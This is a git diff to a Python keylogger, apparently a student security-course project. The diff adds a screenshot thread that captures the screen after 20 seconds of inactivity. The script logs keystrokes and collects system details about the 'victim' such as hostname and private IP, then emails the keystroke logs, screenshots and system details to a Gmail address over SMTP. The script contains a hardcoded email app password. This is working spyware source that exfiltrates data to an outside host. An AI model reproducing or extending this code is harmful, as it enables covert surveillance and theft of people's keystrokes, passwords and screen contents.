@@ -9,15 +9,17 @@ import platform
 
 from pynput.keyboard import Key, Listener
 
+import os
 import time
 
 from requests import get
+
+from PIL import ImageGrab 
 
 keys_info = "key_log.txt"
 sys_info = "sys_info.txt"
 encrypted_key_log = "e_key_log.txt"
 encrypted_sys_info = "e_sys_info.txt"
-
 
 file_path = "/Users/prisharao/Downloads/git-files/6841/comp6841/keylogger/project/" 
 extend = "/"
@@ -32,7 +34,12 @@ password = "hmth kngc bour olqy"
 # good to add more protections for users. 
 
 toaddr =  "nightleaf123@gmail.com"
-time_int = 90
+screenshot_info = "screenshot.png"
+
+time_int = 60
+
+last_activity_time = time.time()
+sys_info_sent = False
 
 def send_email(subject, message, filename, attachment):
     msg = MIMEMultipart()
@@ -55,7 +62,7 @@ def send_email(subject, message, filename, attachment):
 
 # code tutorial for computer info function: https://www.youtube.com/watch?v=25um032xgrw&t=586s
 def computer_information():
-    with open(file_path + extend + sys_info, "a") as f:
+    with open(file_path + extend + sys_info, "w") as f:
         hostname = socket.gethostname()
         IPaddy = socket.gethostbyname(hostname)
         try:
@@ -70,15 +77,28 @@ def computer_information():
         f.write("Machine: " + platform.machine() + "\n")
         f.write("Hostname: " + hostname + "\n")
         f.write("Private IP Address: " + IPaddy + "\n")
-
-send_email("System Info Log", "This file contains the sys info for the victim.", sys_info, file_path + sys_info)
+    
+    send_email("Sys Info Log", "This file contains the system info for the victim.", sys_info, file_path + sys_info)
 
 # simple keylogger implementation
 count = 0
 keys = []
 
+def capture_screenshot():
+    global last_activity_time
+    while True:
+        if time.time() - last_activity_time >= 20:  # 20 seconds of inactivity
+            screenshot_path = file_path + screenshot_info
+            screenshot = ImageGrab.grab()
+            screenshot.save(screenshot_path)
+            print("Screenshot captured due to inactivity.")
+        time.sleep(1)
+
 def if_pressed(key):
-    global keys, count 
+    global keys, count
+
+    global last_activity_time
+    last_activity_time = time.time()
 
     print(key)
     keys.append(key)
@@ -107,17 +127,27 @@ def on_rel(key):
         return False
 
 def gather_and_send():
-    while True:
+    global sys_info_sent
+    
+    if not sys_info_sent: 
         computer_information()
+        sys_info_sent = True
+    
+    while True: 
+        send_email("Key Info Log", "This file contains the Keylogging info for the victim.", keys_info, file_path + keys_info)
+        if os.path.exists(file_path + screenshot_info):
+            send_email("Inactivity Screenshot", "Captured screenshot after 20 seconds of inactivity.", screenshot_info, file_path + screenshot_info)
 
-        send_email("Keystroke Log", "Please find the attached keystroke log.", keys_info, file_path + keys_info)
-
-        open(file_path + keys_info, "w").close()
-
+        open(file_path + keys_info, "w").close()  # Clear the keystroke log after sending
         time.sleep(time_int)
+        if os.path.exists(file_path + screenshot_info):
+            os.remove(file_path + screenshot_info)
 
 if __name__ == "__main__":
     from threading import Thread
+    
+    screenshot_thread = Thread(target=capture_screenshot)
+    screenshot_thread.start()
 
     email_thread = Thread(target=gather_and_send)
     email_thread.start()
